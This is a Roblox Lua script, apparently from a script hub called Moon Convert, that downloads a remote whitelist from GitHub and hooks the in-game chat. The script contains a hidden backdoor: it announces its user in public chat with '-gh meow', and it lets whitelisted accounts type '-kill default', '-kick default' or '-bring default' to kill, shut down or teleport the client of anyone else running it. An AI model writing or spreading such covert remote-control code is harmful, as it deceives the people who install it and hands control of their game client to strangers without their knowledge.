local whitelistdata = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://github.com/sharkywhiskersmeow/Moon-Convert/raw/main/privatebuild/whitelist.json", true))
local possible = {}
local debounce = false

game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")

game:GetService("TextChatService").OnIncomingMessage = function(msg)
  if not msg or not msg.TextSource then return end

  local Player = game:GetService("Players"):GetPlayerByUserId(msg.TextSource.UserId)
  local Text = msg.Text
  local prefix = msg.PrefixText
  local props = Instance.new("TextChatMessageProperties")

  if Text:lower() == "-gh meow" then
    if not whitelistdata[tostring(Player.UserId)] and not table.find(possible, Player) then
    table.insert(possible, Player)
    end
  end





  if whitelistdata[tostring(Player.UserId)] then
    props.PrefixText = "<font color='rgb(" .. whitelistdata[tostring(Player.UserId)].color[1] .. ", " .. whitelistdata[tostring(Player.UserId)].color[2] .. ", " .. whitelistdata[tostring(Player.UserId)].color[3] .. ")'>[" .. whitelistdata[tostring(Player.UserId)].tag .. "]</font> " .. prefix
  elseif table.find(possible, Player) and whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
    props.PrefixText = "<font color='rgb(0, 0, 255)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
  end

  if whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kill default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kick default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
        game:Shutdown()
    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-bring default" and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
      game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = Player.Character.Humanoid.RootPart.CFrame
    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-gh meow" and debounce == false and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh meow")
    end
  return props
end
